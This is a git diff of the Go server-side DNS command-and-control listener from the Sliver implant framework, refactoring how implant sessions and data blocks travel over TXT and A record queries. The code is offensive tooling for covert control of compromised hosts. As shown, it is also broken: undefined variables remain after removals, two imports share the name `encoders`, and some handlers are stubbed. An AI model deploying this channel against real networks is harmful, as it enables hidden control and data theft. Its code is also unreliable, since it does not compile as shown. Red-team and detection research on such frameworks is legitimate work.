@@ -16,57 +16,49 @@ package c2
 
 	You should have received a copy of the GNU General Public License
 	along with this program.  If not, see <https://www.gnu.org/licenses/>.
+	------------------------------------------------------------------------
 
-	---
-	DNS Tunnel Implementation
+	DNS command and control implementation
+
 */
 
 import (
+	secureRand "crypto/rand"
 	"crypto/sha256"
 	"crypto/x509"
-	"math"
+	"errors"
+	"hash/crc32"
+	insecureRand "math/rand"
 	"net"
-	"sort"
 
+	"github.com/bishopfox/sliver/implant/sliver/encoders"
+	"github.com/bishopfox/sliver/protobuf/dnspb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
+	"github.com/bishopfox/sliver/server/certs"
 	"github.com/bishopfox/sliver/server/db"
 	"github.com/bishopfox/sliver/server/generate"
+	"github.com/bishopfox/sliver/util/encoders"
+	"google.golang.org/protobuf/proto"
 
-	"encoding/base32"
 	"encoding/base64"
 	"encoding/binary"
 	"encoding/pem"
 
-	secureRand "crypto/rand"
-	"errors"
 	"fmt"
-	insecureRand "math/rand"
-	"strconv"
 	"strings"
 	"sync"
 	"time"
 
 	consts "github.com/bishopfox/sliver/client/constants"
-	"github.com/bishopfox/sliver/server/certs"
 	"github.com/bishopfox/sliver/server/core"
 	"github.com/bishopfox/sliver/server/cryptography"
-	serverHandlers "github.com/bishopfox/sliver/server/handlers"
 	"github.com/bishopfox/sliver/server/log"
 
 	"github.com/miekg/dns"
-	"google.golang.org/protobuf/proto"
 )
 
 const (
 	sessionIDSize = 12
-
-	domainKeyMsg  = "_domainkey"
-	blockReqMsg   = "b"
-	clearBlockMsg = "cb"
-
-	sessionInitMsg     = "si"
-	sessionPollingMsg  = "sp"
-	sessionEnvelopeMsg = "se"
 
 	// Max TXT record is 255, records are b64 so (n*8 + 5) / 6 = ~250
 	byteBlockSize = 185 // Can be as high as n = 187, but we'll leave some slop
@@ -78,23 +70,59 @@ var (
 
 	dnsCharSet = []rune("abcdefghijklmnopqrstuvwxyz0123456789_")
 
-	sendBlocksMutex = &sync.RWMutex{}
-	sendBlocks      = &map[string]*SendBlock{}
-
 	dnsSessionsMutex = &sync.RWMutex{}
-	dnsSessions      = &map[string]*DNSSession{}
+	dnsSessions      = map[string]*DNSSession{}
 
-	blockReassemblerMutex = &sync.RWMutex{}
-	blockReassembler      = &map[string][][]byte{}
+	sendBlocksMutex = &sync.RWMutex{}
+	sendBlocks      = map[uint32]*Block{}
 
-	dnsSegmentReassemblerMutex = &sync.RWMutex{}
-	dnsSegmentReassembler      = &map[string](*map[int][]string){}
+	recvBlocksMutex = &sync.RWMutex{}
+	recvBlocks      = map[uint32]*Block{}
 )
 
-// SendBlock - Data is encoded and split into `Blocks`
-type SendBlock struct {
-	ID   string
-	Data []string
+// Block - A blob of data that we're sending or receiving, blocks of data
+// are split up into arrays of bytes (chunks) that are encoded per-query
+// the amount of data that can be encoded into a single request or response
+// varies depending on the type of query and the length of the parent domain.
+type Block struct {
+	ID      uint32
+	data    [][]byte
+	Size    int
+	Started time.Time
+	Mutex   sync.RWMutex
+}
+
+func (b *Block) AddData(index int, data []byte) (bool, error) {
+	b.Mutex.Lock()
+	defer b.Mutex.Unlock()
+	if len(b.data) < index+1 {
+		return false, errors.New("Data index out of bounds")
+	}
+	b.data[index] = data
+	sum := 0
+	for _, data := range b.data {
+		sum += len(data)
+	}
+	return sum == b.Size, nil
+}
+
+func (b *Block) GetData(index int) ([]byte, error) {
+	b.Mutex.Lock()
+	defer b.Mutex.Unlock()
+	if len(b.data) < index+1 {
+		return nil, errors.New("Data index out of bounds")
+	}
+	return b.data[index], nil
+}
+
+func (b *Block) Reassemble() []byte {
+	b.Mutex.RLock()
+	defer b.Mutex.RUnlock()
+	data := []byte{}
+	for _, block := range b.data {
+		data = append(data, block...)
+	}
+	return data
 }
 
 // DNSSession - Holds DNS session information
@@ -135,7 +163,10 @@ func StartDNSListener(bindIface string, lport uint16, domains []string, canaries
 	return server
 }
 
-// DNSRequest -> C2 or canary?
+// ---------------------------
+// DNS Handler
+// ---------------------------
+// Handles all DNS queries, first we determine if the query is C2 or a canary
 func handleDNSRequest(domains []string, canaries bool, writer dns.ResponseWriter, req *dns.Msg) {
 	if req == nil {
 		dnsLog.Info("req can not be nil")
@@ -158,7 +189,6 @@ func handleDNSRequest(domains []string, canaries bool, writer dns.ResponseWriter
 	}
 
 	if resp != nil {
-		// dnsLog.Debug(resp.String())
 		writer.WriteMsg(resp)
 	} else {
 		dnsLog.Infof("Invalid query, no DNS response")
@@ -177,7 +207,9 @@ func isC2SubDomain(domains []string, reqDomain string) (bool, string) {
 	return false, ""
 }
 
-// C2 -> Record type?
+// The query is C2, pass to the appropriate record handler this is done
+// so the record handler can encode the response based on the type of
+// record that was requested
 func handleC2(domain string, req *dns.Msg) *dns.Msg {
 	subdomain := req.Question[0].Name[:len(req.Question[0].Name)-len(domain)]
 	if strings.HasSuffix(subdomain, ".") {
@@ -187,24 +219,26 @@ func handleC2(domain string, req *dns.Msg) *dns.Msg {
 	switch req.Question[0].Qtype {
 	case dns.TypeTXT:
 		return handleTXT(domain, subdomain, req)
+	case dns.TypeA:
+		return handleA(domain, subdomain, req)
 	default:
 	}
 	return nil
 }
 
+// ---------------------------
+// Canary Record Handler
+// ---------------------------
 // Canary -> valid? -> trigger alert event
 func handleCanary(req *dns.Msg) *dns.Msg {
-
 	reqDomain := strings.ToLower(req.Question[0].Name)
 	if !strings.HasSuffix(reqDomain, ".") {
 		reqDomain += "." // Ensure we have the FQDN
 	}
-
 	canary, err := db.CanaryByDomain(reqDomain)
 	if err != nil {
 		return nil
 	}
-
 	resp := new(dns.Msg)
 	resp.SetReply(req)
 	if canary != nil {
@@ -239,178 +273,172 @@ func handleCanary(req *dns.Msg) *dns.Msg {
 	return resp
 }
 
-// handles the c2 TXT record interactions, kind hacky this probably needs to get refactored at some point
+func randomIP() net.IP {
+	randBuf := make([]byte, 4)
+	secureRand.Read(randBuf)
+
+	// Ensure non-zeros with various bitmasks
+	return net.IPv4(randBuf[0]|0x10, randBuf[1]|0x10, randBuf[2]|0x1, randBuf[3]|0x10)
+}
+
+// ---------------------------
+// C2 Record Handlers
+// ---------------------------
 func handleTXT(domain string, subdomain string, req *dns.Msg) *dns.Msg {
-
 	q := req.Question[0]
-	fields := strings.Split(subdomain, ".")
-
 	resp := new(dns.Msg)
 	resp.SetReply(req)
-	msgType := strings.ToLower(fields[len(fields)-1])
 
-	switch msgType {
-
-	case domainKeyMsg: // Send PubKey -  _(nonce).(slivername).domainkey.example.com
-		result, err := getDomainKeyFor(domain)
-		if err != nil {
-			dnsLog.Infof("Error during session init: %v", err)
-		}
-		txt := &dns.TXT{
-			Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 0},
-			Txt: result,
-		}
-		resp.Answer = append(resp.Answer, txt)
-
-	case blockReqMsg: // Get block: _(nonce).(start).(stop).(block id).b.example.com
-		if len(fields) == 5 {
-			startIndex := fields[1]
-			stopIndex := fields[2]
-			blockID := fields[3]
-			txt := &dns.TXT{
-				Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 0},
-				Txt: dnsSendBlocks(blockID, startIndex, stopIndex),
-			}
-			resp.Answer = append(resp.Answer, txt)
-		} else {
-			dnsLog.Infof("Block request has invalid number of fields %d expected %d", len(fields), 5)
-		}
-
-	case clearBlockMsg: // Clear block: _(nonce).(block id)._cb.example.com
-		if len(fields) == 3 {
-			result := 0
-			if clearSendBlock(fields[1]) {
-				result = 1
-			}
-			txt := &dns.TXT{
-				Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 0},
-				Txt: []string{fmt.Sprintf("%d", result)},
-			}
-			resp.Answer = append(resp.Answer, txt)
-		}
-
-	case "_" + sessionInitMsg:
-		fallthrough
-	case sessionInitMsg: // Session init: (data)...(seq).(nonce).(_)si.example.com
-		result, err := startDNSSession(domain, fields)
-		if err != nil {
-			dnsLog.Infof("Error during session init: %v", err)
-		}
-		txt := &dns.TXT{
-			Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 0},
-			Txt: result,
-		}
-		resp.Answer = append(resp.Answer, txt)
-
-	case "_" + sessionEnvelopeMsg:
-		fallthrough
-	case sessionEnvelopeMsg:
-		result, err := dnsSessionEnvelope(domain, fields)
-		if err != nil {
-			dnsLog.Infof("Error during session init: %v", err)
-		}
-		txt := &dns.TXT{
-			Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 0},
-			Txt: result,
-		}
-		resp.Answer = append(resp.Answer, txt)
-
-	case sessionPollingMsg:
-		result, err := dnsSessionPoll(domain, fields)
-		if err != nil {
-			dnsLog.Infof("Error during session init: %v", err)
-		}
-		txt := &dns.TXT{
-			Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 0},
-			Txt: result,
-		}
-		resp.Answer = append(resp.Answer, txt)
-
-	default:
-		dnsLog.Infof("Unknown msg type '%s' in TXT req", fields[len(fields)-1])
+	checksum, dnsMsg := parseC2Query(subdomain)
+	if dnsMsg == nil {
+		dnsLog.Errorf("Failed to parse TXT query")
+		return nil
 	}
 
+	// Execute action based on message type
+
+	txtRecords := []string{}
+
+	switch dnsMsg.Type {
+	case dnspb.DNSMessageType_DOMAIN_KEY:
+		blockID := handleDomainKeyQuery(domain, dnsMsg)
+		data, _ := proto.Marshal(&dnspb.DNSMessage{
+			N:    checksum,
+			Data: blockID,
+		})
+		record := string(new(encoders.Base64).Encode(data))
+		txtRecords = append(txtRecords, record)
+	}
+
+	txt := &dns.TXT{
+		Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 0},
+		Txt: txtRecords,
+	}
+	resp.Answer = append(resp.Answer, txt)
 	return resp
 }
 
-// --------------------------- FIELDS ---------------------------
+func handleA(domain string, subdomain string, req *dns.Msg) *dns.Msg {
+	q := req.Question[0]
+	resp := new(dns.Msg)
+	resp.SetReply(req)
 
-func getFieldMsgType(fields []string) (string, error) {
-	if len(fields) < 1 {
-		return "", errors.New("Invalid number of fields in session init message (nonce)")
+	checksum, dnsMsg := parseC2Query(subdomain)
+	if dnsMsg == nil {
+		dnsLog.Errorf("Failed to parse A query")
+		return nil
 	}
-	return fields[len(fields)-1], nil
+
+	switch dnsMsg.Type {
+	case dnspb.DNSMessageType_NOP:
+		break
+	}
+
+	checksumBuf := make([]byte, 4)
+	binary.LittleEndian.PutUint32(checksumBuf, checksum)
+	resp.Answer = append(resp.Answer, &dns.A{
+		Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: 0},
+		A:   checksumBuf,
+	})
+	return resp
 }
 
-func getFieldSessionID(fields []string) (string, error) {
-	if len(fields) < 2 {
-		return "", errors.New("Invalid number of fields in session init message (session id)")
+// ---------------------------
+// C2 Handler
+// ---------------------------
+// This parses the C2 message and performs actions based on the request
+// the response is a CRC32 of the encoded data in the message
+func parseC2Query(subdomain string) (uint32, *dnspb.DNSMessage) {
+	subdomainData := strings.Join(strings.Split(subdomain, "."), "")
+	dnsLog.Debugf("Subdomain = %v, Data = %v", subdomain, subdomainData)
+	dnsMsg := decodeMessage(subdomainData)
+	if dnsMsg == nil {
+		return 0, nil
 	}
-	sessionID := fields[len(fields)-2]
-	if sessionID == "_" {
-		return "", errors.New("Session ID is null")
-	}
-	return sessionID, nil
+	checksum := crc32.Checksum(dnsMsg.Data, crc32.IEEETable)
+	return checksum, dnsMsg
 }
 
-func getFieldNonce(fields []string) (string, error) {
-	if len(fields) < 3 {
-		return "", errors.New("Invalid number of fields in session init message (nonce)")
+func decodeMessage(subdomainData string) *dnspb.DNSMessage {
+	encoders := detectEncoding(subdomainData)
+	query := &dnspb.DNSMessage{}
+	for _, encoder := range encoders {
+		dnsLog.Debugf("Attempting to decode subdomain data with %v", encoder)
+		data, err := encoder.Decode([]byte(subdomainData))
+		if err != nil {
+			dnsLog.Debugf("Decode attempt failed %s, continue ...", err)
+			continue
+		}
+		err = proto.Unmarshal(data, query)
+		if err != nil {
+			dnsLog.Debugf("Failed to parse pb %s, continue ...", err)
+			continue
+		}
+		return query
 	}
-	return fields[len(fields)-3], nil
+	return nil
 }
 
-func getFieldSeq(fields []string) (int, error) {
-	if len(fields) < 4 {
-		return -1, errors.New("Invalid number of fields in session init message (seq)")
+// This function attempts to detect the most likely encoder used by the implant
+// we return a list of encoders in order of most likely to least likely
+func detectEncoding(subdomainData string) []encoders.Encoder {
+
+	// Our version of base32 is missing chars: i, l, o, s
+	// if any of these appear the message must be base62
+	base62Chars := strings.ContainsAny(subdomainData, "silo") // "silo" simply appeases my spell checker
+	if base62Chars {
+		return []encoders.Encoder{new(encoders.Base62)}
 	}
-	rawSeq := fields[len(fields)-4]
-	data, err := dnsDecodeString(rawSeq)
+
+	// Okay now we detect if the message only contains lower case letters
+	// our base32 encoder only uses lower case but a resolver could have
+	// messed with the domain letter cases on the way over to us. So we
+	// say it's likely base62 if it contains a mix but fallback to base32
+	if strings.ContainsAny(subdomainData, "ABCDEFGHIJKLMNOPQRSTUVWXYZ") {
+		return []encoders.Encoder{new(encoders.Base62), new(encoders.Base32)}
+	} else {
+		return []encoders.Encoder{new(encoders.Base32), new(encoders.Base64)}
+	}
+}
+
+// --------------------------- DNS HANDLERS ---------------------------
+func encodeSendBlock(domain string, data []byte) *Block {
+	encodedData := new(encoders.Base64).Encode(data)
+	blockData := [][]byte{}
+	for index := 0; index < len(encodedData); {
+		end := index + 254
+		if len(encodedData) < end {
+			end = len(encodedData)
+		}
+		blockData = append(blockData, encodedData[index:end])
+		index += 254
+	}
+	return &Block{
+		ID:      blockID(),
+		Size:    len(data),
+		data:    blockData,
+		Started: time.Now(),
+		Mutex:   sync.RWMutex{},
+	}
+}
+
+func handleDomainKeyQuery(domain string, query *dnspb.DNSMessage) []byte {
+	domainKey, err := getDomainKeyFor(domain)
 	if err != nil {
-		dnsLog.Infof("Failed to decode seq field: %#v", rawSeq)
-		return 0, err
+		dnsLog.Errorf("Failed to find domain key for '%s' %s", domain, err)
+		return nil
 	}
-	index := int(binary.LittleEndian.Uint32(data))
-
-	return index, nil
+	block := encodeSendBlock(domain, domainKey)
+	sendBlocksMutex.Lock()
+	defer sendBlocksMutex.Unlock()
+	sendBlocks[block.ID] = block
+	return []byte{}
 }
-
-func getFieldSubdata(fields []string) ([]string, error) {
-	if len(fields) < 5 {
-		return []string{}, errors.New("Invalid number of fields in session init message (subdata)")
-	}
-	subdataFields := len(fields) - 4
-	dnsLog.Infof("Domain contains %d subdata fields", subdataFields)
-	return fields[:subdataFields], nil
-}
-
-// --------------------------- DNS SESSION START ---------------------------
 
 // Returns an confirmation value (e.g. exit code 0 non-0) and error
-func startDNSSession(domain string, fields []string) ([]string, error) {
-	dnsLog.Infof("[start session] fields = %#v", fields)
+func startDNSSession(msgID uint32, domain string) ([]string, error) {
 
-	msgType, err := getFieldMsgType(fields)
-	if err != nil {
-		return []string{"1"}, err
-	}
-
-	nonce, err := getFieldNonce(fields)
-	if err != nil {
-		return []string{"1"}, err
-	}
-
-	if !strings.HasPrefix(msgType, "_") {
-		return dnsSegment(fields)
-	}
 	dnsLog.Infof("Complete session init message received, reassembling ...")
-
-	// TODO: We don't have replay protection against the RSA-encrypt
-	// sessionInit messages, but I don't think it's an issue ...
-	encryptedSessionInit, err := dnsSegmentReassemble(nonce)
-	if err != nil {
-		return []string{"1"}, err
-	}
 
 	publicKeyPEM, privateKeyPEM, err := certs.GetCertificate(certs.C2ServerCA, certs.RSAKey, domain)
 	if err != nil {
@@ -452,7 +480,7 @@ func startDNSSession(domain string, fields []string) ([]string, error) {
 	sessionID := dnsSessionID()
 	dnsLog.Infof("Starting new DNS session with id = %s", sessionID)
 	dnsSessionsMutex.Lock()
-	(*dnsSessions)[sessionID] = &DNSSession{
+	dnsSessions[sessionID] = &DNSSession{
 		ID:      sessionID,
 		Session: session,
 		Key:     aesKey,
@@ -461,357 +489,14 @@ func startDNSSession(domain string, fields []string) ([]string, error) {
 	dnsSessionsMutex.Unlock()
 
 	encryptedSessionID, _ := cryptography.GCMEncrypt(aesKey, []byte(sessionID))
-	result, err := dnsSendOnce(encryptedSessionID)
-	if err != nil {
-		dnsLog.Infof("Failed to encode message into single result %v", err)
-		return []string{"1"}, err
-	}
 
 	return result, nil
-}
-
-// --------------------------- DNS SESSION RECV ---------------------------
-
-func dnsSessionEnvelope(domain string, fields []string) ([]string, error) {
-	dnsLog.Infof("[session envelope] fields = %#v", fields)
-
-	msgType, err := getFieldMsgType(fields)
-	if err != nil {
-		return []string{"1"}, err
-	}
-
-	nonce, err := getFieldNonce(fields)
-	if err != nil {
-		return []string{"1"}, err
-	}
-
-	if !strings.HasPrefix(msgType, "_") {
-		return dnsSegment(fields)
-	}
-	dnsLog.Infof("Complete envelope received, reassembling ...")
-	encryptedDNSEnvelope, err := dnsSegmentReassemble(nonce)
-	if err != nil {
-		return []string{"1"}, errors.New("Failed to reassemble segments")
-	}
-
-	sessionID, err := getFieldSessionID(fields)
-	if err != nil {
-		return []string{"1"}, err
-	}
-	dnsSessionsMutex.Lock()
-	defer dnsSessionsMutex.Unlock()
-
-	if dnsSession, ok := (*dnsSessions)[sessionID]; ok {
-		dnsLog.Infof("Envelope has valid DNS session (%s)", dnsSession.ID)
-		if dnsSession.isReplayAttack(encryptedDNSEnvelope) {
-			dnsLog.Infof("WARNING: Replay attack detected, ignore request")
-			return []string{"1"}, errors.New("Replay attack")
-		}
-		envelopeData, err := cryptography.GCMDecrypt(dnsSession.Key, encryptedDNSEnvelope)
-		if err != nil {
-			return []string{"1"}, errors.New("Failed to decrypt DNS envelope")
-		}
-		envelope := &sliverpb.Envelope{}
-		proto.Unmarshal(envelopeData, envelope)
-
-		dnsLog.Infof("Envelope Type = %#v RespID = %#v", envelope.Type, envelope.ID)
-
-		dnsSession.Session.UpdateCheckin()
-
-		// Response Envelope or Handler
-		handlers := serverHandlers.GetSessionHandlers()
-		if envelope.ID != 0 {
-			dnsSession.Session.RespMutex.Lock()
-			defer dnsSession.Session.RespMutex.Unlock()
-			if resp, ok := dnsSession.Session.Resp[envelope.ID]; ok {
-				resp <- envelope
-			}
-		} else if handler, ok := handlers[envelope.Type]; ok {
-			handler.(func(*core.Session, []byte))(dnsSession.Session, envelope.Data)
-		}
-		return []string{"0"}, nil
-	}
-	dnsLog.Infof("Invalid session id '%#v'", sessionID)
-	return []string{"1"}, errors.New("Invalid session ID")
-}
-
-// Client should have sent all of the data, attempt to reassemble segments
-func dnsSegmentReassemble(nonce string) ([]byte, error) {
-	dnsSegmentReassemblerMutex.Lock()
-	defer dnsSegmentReassemblerMutex.Unlock()
-	if reasm, ok := (*dnsSegmentReassembler)[nonce]; ok {
-		var keys []int
-		for k := range *reasm {
-			keys = append(keys, k)
-		}
-		sort.Ints(keys)
-		orderedSubdata := []string{}
-		for _, k := range keys {
-			orderedSubdata = append(orderedSubdata, (*reasm)[k]...)
-		}
-		data, err := dnsDecodeString(strings.Join(orderedSubdata, ""))
-		if err != nil {
-			dnsLog.Infof("Failed to decode session init: %v", err)
-			return nil, err
-		}
-		//BUG - in the event that the session init msg does not make it to the client, this will fail. This has been
-		//observed consistently (Namely due to the race condition bug that is also being fixed in dnsSessionPoll).
-		//Currently a memory leak. Consider tracking moving the cleanup code to after polling has
-		//begun to ensure the initial handshake was successful.
-		//
-		//delete((*dnsSegmentReassembler), nonce)
-		return data, nil
-	}
-	return nil, fmt.Errorf("Invalid nonce '%#v' (session init reassembler)", nonce)
-}
-
-// The domain is only a segment of the startDNSSession message, so we just store the data
-func dnsSegment(fields []string) ([]string, error) {
-	dnsSegmentReassemblerMutex.Lock()
-	defer dnsSegmentReassemblerMutex.Unlock()
-
-	nonce, _ := getFieldNonce(fields)
-	index, err := getFieldSeq(fields)
-	if err != nil {
-		return []string{"1"}, err
-	}
-	subdata, err := getFieldSubdata(fields)
-	if err != nil {
-		return []string{"1"}, err
-	}
-	if _, ok := (*dnsSegmentReassembler)[nonce]; !ok {
-		(*dnsSegmentReassembler)[nonce] = &map[int][]string{}
-	}
-	if reasm, ok := (*dnsSegmentReassembler)[nonce]; ok {
-		(*reasm)[index] = subdata
-		return []string{"0"}, nil
-	}
-	dnsLog.Infof("Invalid nonce (session segment): %#v", nonce)
-	return []string{"1"}, errors.New("Invalid nonce (session segment)")
-}
-
-// TODO: Avoid double-fetch
-func getDomainKeyFor(domain string) ([]string, error) {
-	_, _, err := certs.GetCertificate(certs.C2ServerCA, certs.RSAKey, domain)
-	if err != nil {
-		certs.C2ServerGenerateRSACertificate(domain)
-	}
-	certPEM, _, err := certs.GetCertificate(certs.C2ServerCA, certs.RSAKey, domain)
-	if err != nil {
-		return nil, err
-	}
-	return dnsSendOnce(certPEM)
-}
-
-// --------------------------- DNS SESSION SEND ---------------------------
-
-// Send all response data in a single TXT record, limited to 65535 bytes
-func dnsSendOnce(rawData []byte) ([]string, error) {
-	if 65535 <= base64.RawStdEncoding.EncodedLen(len(rawData)) {
-		return nil, errors.New("Response too large to encode into one TXT record")
-	}
-	data := base64.RawStdEncoding.EncodeToString(rawData)
-	dnsLog.Infof("Encoding single resp: %#v", data)
-	txts := []string{}
-	size := int(math.Ceil(float64(len(data)) / 255.0))
-	for index := 0; index < size; index++ {
-		start := index * 255
-		stop := start + 255
-		if len(data) < stop {
-			stop = len(data)
-		}
-		txts = append(txts, data[start:stop])
-	}
-	return txts, nil
-}
-
-func dnsSessionPoll(domain string, fields []string) ([]string, error) {
-
-	sessionID, err := getFieldSessionID(fields)
-	if err != nil {
-		return []string{"1"}, errors.New("invalid session id (session poll)")
-	}
-	dnsSessionsMutex.Lock()
-	dnsSession, found := (*dnsSessions)[sessionID]
-	if !found {
-		dnsSessionsMutex.Unlock()
-		b64SessionId := base64.RawStdEncoding.EncodeToString([]byte(sessionID))
-		return []string{b64SessionId}, errors.New("invalid session (nil pointer)")
-	}
-	dnsSessionsMutex.Unlock()
-
-	isDrained := false
-	envelopes := []*sliverpb.Envelope{}
-	for !isDrained {
-		select {
-		case envelope := <-dnsSession.Session.Send:
-			dnsLog.Infof("New message from send channel ...")
-			envelopes = append(envelopes, envelope)
-		default:
-			isDrained = true
-		}
-	}
-
-	dnsSession.Session.UpdateCheckin()
-
-	if 0 < len(envelopes) {
-		dnsLog.Infof("%d new message(s) for session id %#v", len(envelopes), sessionID)
-		dnsPoll := &sliverpb.DNSPoll{}
-		for _, envelope := range envelopes {
-			data, err := proto.Marshal(envelope)
-			if err != nil {
-				dnsLog.Infof("Failed to encode envelope %v", err)
-				continue
-			}
-
-			encryptedEnvelopeData, err := cryptography.GCMEncrypt(dnsSession.Key, data)
-			if err != nil {
-				dnsLog.Infof("Failed to encrypt poll data %v", err)
-				return []string{"1"}, errors.New("Failed to encrypt dns poll data")
-			}
-
-			blockID, size := storeSendBlocks(encryptedEnvelopeData)
-			dnsPoll.Blocks = append(dnsPoll.Blocks, &sliverpb.DNSBlockHeader{
-				ID:   blockID,
-				Size: uint32(size),
-			})
-		}
-		pollData, err := proto.Marshal(dnsPoll)
-		if err != nil {
-			dnsLog.Infof("Failed to encode envelope %v", err)
-			return []string{"1"}, errors.New("Failed to encode dns poll data")
-		}
-		encryptedPollData, err := cryptography.GCMEncrypt(dnsSession.Key, pollData)
-		if err != nil {
-			dnsLog.Infof("Failed to encrypt poll data %v", err)
-			return []string{"1"}, errors.New("Failed to encrypt dns poll data")
-		}
-		return dnsSendOnce(encryptedPollData)
-	}
-	dnsLog.Infof("No new message for session id %#v", sessionID)
-	return []string{"0"}, nil
-}
-
-// Send blocks of data via multiple DNS TXT responses
-func dnsSendBlocks(blockID string, startIndex string, stopIndex string) []string {
-	start, err := strconv.Atoi(startIndex)
-	if err != nil {
-		return []string{}
-	}
-	stop, err := strconv.Atoi(stopIndex)
-	if err != nil {
-		return []string{}
-	}
-
-	if stop < start {
-		return []string{}
-	}
-
-	dnsLog.Infof("Send blocks %d to %d for ID %s", start, stop, blockID)
-
-	sendBlocksMutex.Lock()
-	defer sendBlocksMutex.Unlock()
-	respBlocks := []string{}
-	if block, ok := (*sendBlocks)[blockID]; ok {
-		for index := start; index < stop; index++ {
-			if index < len(block.Data) {
-				respBlocks = append(respBlocks, block.Data[index])
-			}
-		}
-		dnsLog.Infof("Sending %d response block(s)", len(respBlocks))
-		return respBlocks
-	}
-	dnsLog.Infof("Invalid block ID: %#v", blockID)
-	return []string{}
-}
-
-// Clear send blocks of data from memory
-func clearSendBlock(blockID string) bool {
-	sendBlocksMutex.Lock()
-	defer sendBlocksMutex.Unlock()
-	if _, ok := (*sendBlocks)[blockID]; ok {
-		delete(*sendBlocks, blockID)
-		return true
-	}
-	return false
-}
-
-// Stores encoded blocks fo data into "sendBlocks"
-func storeSendBlocks(data []byte) (string, int) {
-	blockID := generateBlockID()
-
-	sendBlock := &SendBlock{
-		ID:   blockID,
-		Data: []string{},
-	}
-	for index := 0; index < len(data); index += byteBlockSize {
-		start := index
-		stop := index + byteBlockSize
-		if len(data) < stop {
-			stop = len(data)
-		}
-		encoded := base64.RawStdEncoding.EncodeToString(data[start:stop])
-		dnsLog.Infof("Encoded block is %d bytes", len(encoded))
-		sendBlock.Data = append(sendBlock.Data, encoded)
-	}
-	sendBlocksMutex.Lock()
-	(*sendBlocks)[sendBlock.ID] = sendBlock
-	sendBlocksMutex.Unlock()
-	return sendBlock.ID, len(sendBlock.Data)
-}
-
-// --------------------------- HELPERS ---------------------------
-
-// Unique IDs, no need for secure random
-func generateBlockID() string {
-	insecureRand.Seed(time.Now().UnixNano())
-	blockID := []rune{}
-	for i := 0; i < blockIDSize; i++ {
-		index := insecureRand.Intn(len(dnsCharSet))
-		blockID = append(blockID, dnsCharSet[index])
-	}
-	return string(blockID)
 }
 
 func fingerprintSHA256(block *pem.Block) string {
 	hash := sha256.Sum256(block.Bytes)
 	b64hash := base64.RawStdEncoding.EncodeToString(hash[:])
 	return strings.TrimRight(b64hash, "=")
-}
-
-// TODO: Add a geofilter to make it look like we're in various regions of the world.
-// We don't really need to use srand but it's just easier to operate on bytes here.
-func randomIP() net.IP {
-	randBuf := make([]byte, 4)
-	secureRand.Read(randBuf)
-
-	// Ensure non-zeros with various bitmasks
-	return net.IPv4(randBuf[0]|0x10, randBuf[1]|0x10, randBuf[2]|0x1, randBuf[3]|0x10)
-}
-
-// --------------------------- ENCODER ---------------------------
-
-var base32Alphabet = "ab1c2d3e4f5g6h7j8k9m0npqrtuvwxyz"
-var sliverBase32 = base32.NewEncoding(base32Alphabet)
-
-// EncodeToString encodes the given byte slice in base32
-func dnsEncodeToString(input []byte) string {
-	return strings.TrimRight(sliverBase32.EncodeToString(input), "=")
-}
-
-// DecodeString decodes the given base32 encoded bytes
-func dnsDecodeString(raw string) ([]byte, error) {
-	pad := 8 - (len(raw) % 8)
-	padded := []byte(raw)
-	if pad != 8 {
-		padded = make([]byte, len(raw)+pad)
-		copy(padded, raw)
-		for index := 0; index < pad; index++ {
-			padded[len(raw)+index] = '='
-		}
-	}
-	// dnsLog.Infof("[base32] %#v", string(padded))
-	return sliverBase32.DecodeString(string(padded))
 }
 
 // SessionIDs are public parameters in this use case
@@ -823,5 +508,23 @@ func dnsSessionID() string {
 		index := insecureRand.Intn(len(dnsCharSet))
 		sessionID = append(sessionID, dnsCharSet[index])
 	}
-	return "_" + string(sessionID)
+	return string(sessionID)
+}
+
+func blockID() uint32 {
+	randBuf := make([]byte, 4)
+	secureRand.Read(randBuf)
+	return binary.LittleEndian.Uint32(randBuf)
+}
+
+func getDomainKeyFor(domain string) ([]byte, error) {
+	_, _, err := certs.GetCertificate(certs.C2ServerCA, certs.RSAKey, domain)
+	if err != nil {
+		certs.C2ServerGenerateRSACertificate(domain)
+	}
+	certPEM, _, err := certs.GetCertificate(certs.C2ServerCA, certs.RSAKey, domain)
+	if err != nil {
+		return nil, err
+	}
+	return certPEM, nil
 }
